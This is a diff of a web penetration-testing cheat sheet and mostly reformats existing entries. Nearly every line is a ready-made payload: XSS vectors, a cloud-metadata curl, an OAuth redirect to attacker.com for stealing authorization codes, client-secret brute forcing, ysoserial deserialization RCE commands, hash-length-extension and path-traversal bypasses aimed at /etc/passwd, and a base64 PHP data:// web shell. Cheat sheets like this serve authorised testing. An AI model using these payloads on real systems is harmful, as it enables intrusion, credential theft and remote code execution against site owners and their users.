@@ -175,7 +175,7 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 Ex:
  
 -> decode URI + unescape method  
-`decodeURI(/alert(%22xss%22)/.source)`
+`decodeURI(/alert(%22xss%22)/.source)`  
 `decodeURIComponent(/alert(%22xss%22)/.source)`
   
 Add execution sink for execution:
@@ -184,8 +184,8 @@ Add execution sink for execution:
   
 ### Escaping Parentheses
   
-`<img src=x onerror="\u0061lert(1)"/>`
-`<img src=x onerror="eval('\141lert(1)')"/>`
+`<img src=x onerror="\u0061lert(1)"/>`  
+`<img src=x onerror="eval('\141lert(1)')"/>`  
 `<img src=x onerror="eval('\x61lert(1)')"/>`
 
 ### Others Examples
@@ -195,7 +195,8 @@ Add execution sink for execution:
 ```
 <div>here</div>
 ```
--> `<svg/onload=alert(1)`
+-> 
+`<svg/onload=alert(1)`
 
 #### HTML Tag Attributes
 
@@ -203,7 +204,8 @@ Add execution sink for execution:
 <input value="here"/></input>
 ```
  
--> `adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--`
+-> 
+`adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--`
   
 #### Script Tag
   
@@ -213,13 +215,15 @@ Add execution sink for execution:
 </script>
 ```
   
-->`;alert(1);//`
+->
+`;alert(1);//`
 
 #### Event Attributes
 
 `<button onclick="reserve(here);">Okay!</button>`
 
--> alert(1)
+-> 
+`alert(1)`
 
 Dom Based
   
@@ -227,7 +231,8 @@ Dom Based
 <script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
 ```
   
--> `javascript:alert(1)`
+->
+`javascript:alert(1)`
 
 ### JavaScript Encoding and Compressor:
 
@@ -414,7 +419,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 ### Meta-data
 
 `curl http://169.254.169.254/latest/meta-data`
-`http://169.254.169.254/latest/api/token`
+`curl http://169.254.169.254/latest/api/token`
 
 ### Serverless Injection
 
@@ -476,26 +481,24 @@ Vulnerability Code Stealing
 
 -> Open Redirect (redirect_uri)
   
-https://site.com/authorization?client_id=<client_id>&redirect_uri=http://attacker.com/callback&response_type=code&scope=openid%20profile%20email
-  
-3-
+`https://site.com/authorization?client_id=<client_id>&redirect_uri=http://attacker.com/callback&response_type=code&scope=openid%20profile%20email`
 
+3-
+```
 POST /token HTTP/1.1
-  
 Host: oauth.server.com
 
 client_id=<client_id>&client_secret=<client_secret>&redirect_uri=https://site.com/callback&grant_type=authorization_code&code= \<code>
-  
+```
 Vulnerability Brute-Force the Client Secret
 
-POST /token
-  
-content-type: application/x-www-form-urlencoded
-  
-host: site.com
-  
+```
+POST /token 
+Host: site.com
+Content-Type: application/x-www-form-urlencoded  
+
 client_id=\<client_id>&client_secret=\<BRUTE_FORCE>&redirect_uri=http%3A%2F%2Fip%2Fcallback&grant_type=authorization_code&code= \<code>
-  
+```  
 4-
   
 {
@@ -536,33 +539,32 @@ Authorization: Bearer \<token>
 
 ### Exploiting 
 
-java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class
-
+`java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class`  
 https://github.com/frohoff/ysoserial
 
-python shiro_exp.py site.com/home.jsp cookie payload.class
-
+`python shiro_exp.py site.com/home.jsp cookie payload.class`  
 https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
   
 ## Hash Length Extension Attack
 
-https://github.com/iagox86/hash_extender
-
+-> Identify  
 https://site.com/index.php?file=oktest&hash=hash
 
-./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out
+-> Exploitation  
+1-
+`./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out`  
+https://github.com/iagox86/hash_extender
 
+2-  
 burp intruder -> payloads.out in file parameter.  
   
 ## Insecure - Machine Key for RCE 
 
-https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md
-  
-https://github.com/pwntester/ysoserial.net
-  
+https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md   
+https://github.com/pwntester/ysoserial.net  
 https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
   
-### Others Docs
+### Other Docs
 
 https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
 
@@ -572,37 +574,35 @@ https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-f
 
 #### Common
 
-../../../../etc/passwd
+`/etc/passwd`
+`../../../../etc/passwd`
 
 #### Replace ../
 
 $language = str_replace('../', '', $_GET['file']);
-
-/....//....//....//....//etc/passwd
-  
-..././..././..././..././etc/paswd
-  
-....\/....\/....\/....\/etc/passwd
+`/....//....//....//....//etc/passwd`  
+`..././..././..././..././etc/paswd`  
+`....\/....\/....\/....\/etc/passwd`
 
 #### Block . and /
 
 -> urlencode and Double urlencode
 
-/etc/passwd
+/etc/passwd:
 
-%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+`%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
 
-%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
+`%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34`
   
 #### PHP Wrappers
 
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`
   
-expect://id
+`expect://id`
 
-php://filter/read=convert.base64-encode/resource=index.php
+`php://filter/read=convert.base64-encode/resource=index.php`
   
-php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
+`php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`
 
 #### Filter PHP
 
